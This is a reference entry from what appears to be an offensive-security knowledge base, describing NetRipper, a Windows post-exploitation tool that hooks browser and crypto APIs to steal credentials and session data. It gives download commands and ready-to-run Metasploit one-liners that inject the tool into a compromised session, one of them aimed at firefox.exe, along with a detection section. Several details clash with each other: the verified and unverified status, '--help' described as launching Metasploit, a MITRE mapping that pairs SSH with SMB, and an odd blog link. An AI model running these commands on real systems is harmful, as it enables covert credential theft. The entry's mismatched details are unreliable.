---
id: b54ff15e-5ebc-41bd-abbe-475e6890187a
name: NetRipper
type: tool
verified: true
created_at: '2019-08-28T21:17:42.294012+00:00'
updated_at: '2023-05-29T16:48:53.029709+00:00'
description: >-
  Post-exploitation tool for Windows that uses API hooking to intercept and
  capture network traffic, including encrypted data, from low-privileged users.
url: 'https://github.com/Nhancer/NetRipper'
platforms:
  - Windows
tags:
  - post-exploitation
  - traffic-capture
  - api-hooking
  - credential-access
commands:
  - '[[commands/msf-run-netripper-post-module]]'
validated: true
---

# NetRipper

**Status**: Unverified

## Overview

NetRipper is a post-exploitation tool designed for Windows systems. It employs API hooking techniques to monitor and intercept network traffic and encryption-related functions, even from low-privileged user contexts. This allows attackers to capture plaintext traffic as well as encrypted data at the point of encryption/decryption, making it useful for stealing credentials, session tokens, and other sensitive information transmitted over protocols like HTTP, HTTPS, FTP, and SMTP.

Common use cases include capturing form submissions, API calls, and authentication data during lateral movement or data exfiltration phases in red team engagements.

## Description

NetRipper operates by injecting a DLL into target processes (e.g., browsers, email clients) on a compromised Windows host. Once loaded, it hooks Windows API calls related to networking (e.g., WinINet, WinHTTP) and cryptography (e.g., CryptoAPI), enabling the interception of data before it is encrypted or after it is decrypted. This bypasses standard network monitoring tools that cannot see inside encrypted sessions. The tool supports multiple protocols and can dump captured data to files for offline analysis. It is particularly effective against applications that handle user credentials or sensitive communications without additional protections like certificate pinning.

## Features

- **API Hooking**: Intercepts calls to network and crypto APIs in real-time.
- **Multi-Protocol Support**: Captures traffic from HTTP/HTTPS, FTP, SMTP, POP3, and more.
- **Low-Privilege Operation**: Functions from standard user accounts without needing admin rights for injection.
- **Data Dumping**: Saves captured credentials, POST data, and files to loot directories.
- **Process Targeting**: Selective injection into specific processes like browsers or services.
- **Integration with Frameworks**: Native support in Metasploit for easy deployment via sessions.

## Installation

### Requirements

- A compromised Windows host with an active Meterpreter or similar shell session.
- Metasploit Framework (for easiest deployment).
- Administrative privileges on the attacker's machine for running msfconsole.

### Install Commands

NetRipper is distributed as a DLL and does not require traditional installation. Download the binaries from the official repository:

```bash
# On Kali Linux or Ubuntu
apt update && apt install metasploit-framework  # If not already installed
wget https://github.com/Nhancer/NetRipper/archive/master.zip
unzip master.zip
cd NetRipper-master
# The DLL (NetRipper.dll) is ready for use with Metasploit
```

For manual injection (advanced), use tools like Process Hacker or custom injectors, but Metasploit integration is recommended.

## Basic Usage

```bash
msfconsole --help  # Launch Metasploit to get started
```

Load the module and run it against a session (see related commands for details).

### Common Options

| Option | Description |
|--------|-------------|
| `set SESSION <id>` | Specifies the Meterpreter session ID |
| `set PROC_NAME <process>` | Targets a specific process (e.g., chrome.exe) |
| `set ENABLE_CRYPTO <true/false>` | Toggles crypto API hooking |
| `run` | Executes the module |

## Examples

### Example 1: Basic Usage

Load and run NetRipper on a default session to capture all eligible traffic:

```bash
msfconsole -q -x "use post/windows/manage/netripper; set SESSION 1; run"
```

### Example 2: Advanced Usage

Target a specific browser process for credential capture:

```bash
msfconsole -q -x "use post/windows/manage/netripper; set SESSION 1; set PROC_NAME firefox.exe; set ENABLE_CRYPTO true; run"
```

Captured data will appear in `~/.msf4/loot/` as text files or PCAPs.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Network Sniffing]] Network Sniffing
- [[Password Managers]] Credentials from Password Stores (via hooked APIs)
- [[SSH]] Remote Services (SMB/Windows Admin Shares for injection)

### Tactics

- [[Command and Control]] Command and Control
- [[Collection]] Collection
- [[Credential Access]] Credential Access

## Detection

Indicators and methods for detecting this tool's usage:

- **Process Anomalies**: Unusual DLL loads (NetRipper.dll) in browser or network processes via tools like Process Explorer or Sysmon (Event ID 7: Image Loaded).
- **API Hooking Artifacts**: Monitor for hooked functions in WinINet/WinHTTP using API Monitor or ETW tracing.
- **Network Behavior**: Unexpected file writes to loot directories or increased disk I/O on compromised hosts.
- **Metasploit Signatures**: EDR tools detecting msfconsole executions or post module loads.
- **Behavioral Analytics**: Anomalous traffic patterns or credential dumps in logs.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit-Framework]]
- [[tools/Meterpreter]]
- [[tools/Wireshark]]

## References

- Official GitHub: https://github.com/Nhancer/NetRipper
- Metasploit Module Documentation: https://docs.metasploit.com/docs/post/windows/manage/netripper.html
- Related Blog: https://www.ghisler.ch/netripper

*Last updated: 2023-05-29T16:48:53.029709+00:00*
